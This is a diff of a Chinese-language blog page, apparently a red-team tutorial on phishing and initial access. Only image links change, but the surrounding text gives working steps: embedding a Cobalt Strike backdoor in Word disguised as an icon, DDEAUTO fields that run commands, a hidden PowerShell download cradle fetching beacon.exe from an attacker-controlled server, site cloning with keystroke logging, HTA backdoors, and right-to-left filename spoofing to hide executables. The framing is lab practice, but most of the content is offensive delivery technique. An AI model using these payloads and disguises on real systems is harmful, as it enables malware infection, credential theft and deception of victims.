@@ -208,21 +207,21 @@
 
 <p>生成 poc.doc 放到靶机上执行，靶机弹出计算机，可以把 calc 换成 powershell 下载后门命令</p>
 <h3 id="word插入外部对象上线"><a href="#word插入外部对象上线" class="headerlink" title="word插入外部对象上线"></a>word插入外部对象上线</h3><p>插入-&gt;对象</p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-37-1024x104.png" alt="img"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021536951.png" alt="image-20231002153629908"></p>
 <p>插入 Cobalt Strike 生成的 exe 后门文件，然后显示为图标，更改图标，改个题注，可以把图标也换一下</p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-38.png" alt="img"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021539742.png" alt="image-20231002153900683"></p>
 <p>在word里面多出来这个</p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-39.png" alt="img"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021539591.png" alt="image-20231002153913543"></p>
 <p>点击后，靶机上线</p>
 <h3 id="word文档构造DDE"><a href="#word文档构造DDE" class="headerlink" title="word文档构造DDE"></a>word文档构造DDE</h3><p>创建一个docx文档，然后快捷键 Ctrl+f9 快速创建一个域，在花括号填入如下指令</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DDEAUTO c:\\windows\\system32\\cmd.exe &quot;\/k calc.exe&quot;</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-40.png" alt="img"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021539722.png" alt="image-20231002153925686"></p>
 <p>放到靶机上执行，靶机会弹出计算机，可以把计算机换成其它上线命令</p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-41.png" alt="img"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021539528.png" alt="image-20231002153935490"></p>
 <p>比如用powershell上线，先生成木马</p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-42.png" alt="img"></p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-43.png" alt="img"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021539885.png" alt="image-20231002153944840"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021539744.png" alt="image-20231002153957698"></p>
 <p>在保存木马的地方用 python -m http.server 8080 开启简易web服务</p>
 <p>{}内写如下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DDEAUTO &quot;C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP</span><br><span class="line">-sta -NonI -W Hidden IEX (New-Object</span><br><span class="line">System.Net.WebClient).DownloadString(&#x27;http://192.168.137.1:8080/beacon.exe&#x27;)</span><br><span class="line">; # &quot; &quot;Microsoft Document Security Add-On&quot;</span><br></pre></td></tr></table></figure>
@@ -245,9 +244,9 @@
 <h2 id="克隆网站钓鱼"><a href="#克隆网站钓鱼" class="headerlink" title="克隆网站钓鱼"></a>克隆网站钓鱼</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42516903/article/details/112398825">https://blog.csdn.net/weixin_42516903/article/details/112398825</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/ITmincherry/article/details/105716951">https://blog.csdn.net/ITmincherry/article/details/105716951</a></p>
 <p>工具包：<a target="_blank" rel="noopener" href="https://github.com/trustedsec/social-engineer-toolkit">https://github.com/trustedsec/social-engineer-toolkit</a></p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-44.png" alt="img"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021540008.png" alt="image-20231002154012952"></p>
 <p>注意端口不要冲突，把键盘记录打开</p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-45.png" alt="img"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021540146.png" alt="image-20231002154030095"></p>
 <p>我这里直接克隆会报错，可以使用其他工具克隆，然后放在本地，在克隆本地即可</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例如：wget -r -p -np -k https://www.baidu.com</span><br></pre></td></tr></table></figure>
 
@@ -258,15 +257,15 @@
 <h2 id="HTML-Application"><a href="#HTML-Application" class="headerlink" title="HTML Application"></a>HTML Application</h2><p>准确的说 HTML Application 并不是一个后门上线方式，而是其本身就是一个后门程序，只是其文件后缀为 hta 比较隐蔽所以放到这里了。</p>
 <p>将 HTML 保存为 .hta 后缀即可生成 HTML Application 程序，HTML Application 可以用 vbscript 或者 jscript 编写，可以编写一个 HTML Application 程序后门，目标执行了就会被获取 shell。（Cobalt Strike 生成的 HTML Application 程序后门是用 vbscript 编写的）</p>
 <p>Cobalt Strike 生成 HTML Application 类型后门</p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-46.png" alt="img"></p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-47.png" alt="img"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021540806.png" alt="image-20231002154041759"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021540082.png" alt="image-20231002154052040"></p>
 <p>方法选择 powershell 类型，这样生成的 HTML Application 程序是以 powershell 执行命令的，也就是 HTML Application 调用 powershell</p>
 <p>放到靶机上执行后门文件， Cobalt Strike 即可获取到 shell</p>
 <h2 id="一些隐藏小技巧"><a href="#一些隐藏小技巧" class="headerlink" title="一些隐藏小技巧"></a>一些隐藏小技巧</h2><h3 id="文件名反转"><a href="#文件名反转" class="headerlink" title="文件名反转"></a>文件名反转</h3><p>在文件名中插入 RLO unicode 字符，可以反转文件名，比如把前面 HTML Application 程序后门进行文件名反转</p>
 <p>先改个名字，<code>shelltxt.hta</code>，选中shell后面，txt前面</p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-48.png" alt="img"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021541661.png" alt="image-20231002154104598"></p>
 <p>文件名反转</p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-49.png" alt="img"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021541355.png" alt="image-20231002154116326"></p>
 <h3 id="更改图标"><a href="#更改图标" class="headerlink" title="更改图标"></a>更改图标</h3><p>工具：ResourceHacker</p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/jj0219/p/11398356.html">https://www.cnblogs.com/jj0219/p/11398356.html</a></p>
 <p>参考：</p>
